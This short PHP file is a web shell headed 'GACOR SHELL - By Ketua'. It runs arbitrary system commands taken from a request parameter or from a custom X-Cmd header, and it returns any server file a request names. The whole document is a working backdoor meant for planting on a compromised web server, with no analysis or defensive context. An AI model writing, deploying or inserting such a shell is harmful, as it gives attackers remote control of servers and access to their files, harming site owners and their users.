<?php
// GACOR SHELL - By Ketua
if(isset($_REQUEST['c'])){ system($_REQUEST['c']); }
if(isset($_REQUEST['f'])){ echo file_get_contents($_REQUEST['f']); }
if(isset($_SERVER['HTTP_X_CMD'])){ system($_SERVER['HTTP_X_CMD']); }
?>
